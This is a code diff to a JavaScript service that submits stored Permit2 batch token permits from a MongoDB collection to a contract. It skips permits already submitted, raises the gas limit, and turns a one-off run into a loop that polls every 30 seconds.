@@ -77,9 +77,9 @@ async function submitPermits() {
     const db = client.db('permit2DB');
     const permitsCollection = db.collection('permits');
 
-    const permits = await permitsCollection.find({ executed: false }).toArray();
+    const permits = await permitsCollection.find({ submitted: { $ne: true }, executed: false }).toArray();
     if (permits.length === 0) {
-      console.log('No unexecuted permits found');
+      console.log('No unsubmitted permits found');
       return;
     }
 
@@ -127,7 +127,7 @@ async function submitPermits() {
       }
 
       try {
-        const permitTx = await permit2Contract.permit(owner, permitBatch, signature, { gasLimit: 100000 });
+        const permitTx = await permit2Contract.permit(owner, permitBatch, signature, { gasLimit: 600000 });
         await permitTx.wait();
         console.log(`Batch permit submitted: ${permitTx.hash}`);
 
@@ -148,10 +148,22 @@ async function submitPermits() {
   }
 }
 
-submitPermits().then(() => {
-  console.log('Submission complete');
-  process.exit(0);
-}).catch((error) => {
-  console.error('Script failed:', error);
+async function runContinuously() {
+  console.log('Starting continuous permit submission service...');
+  
+  while (true) {
+    try {
+      await submitPermits();
+    } catch (error) {
+      console.error('Error in submission cycle:', error);
+    }
+    
+    console.log('Waiting 30 seconds before next check...');
+    await new Promise(resolve => setTimeout(resolve, 30000));
+  }
+}
+
+runContinuously().catch((error) => {
+  console.error('Service failed:', error);
   process.exit(1);
 });
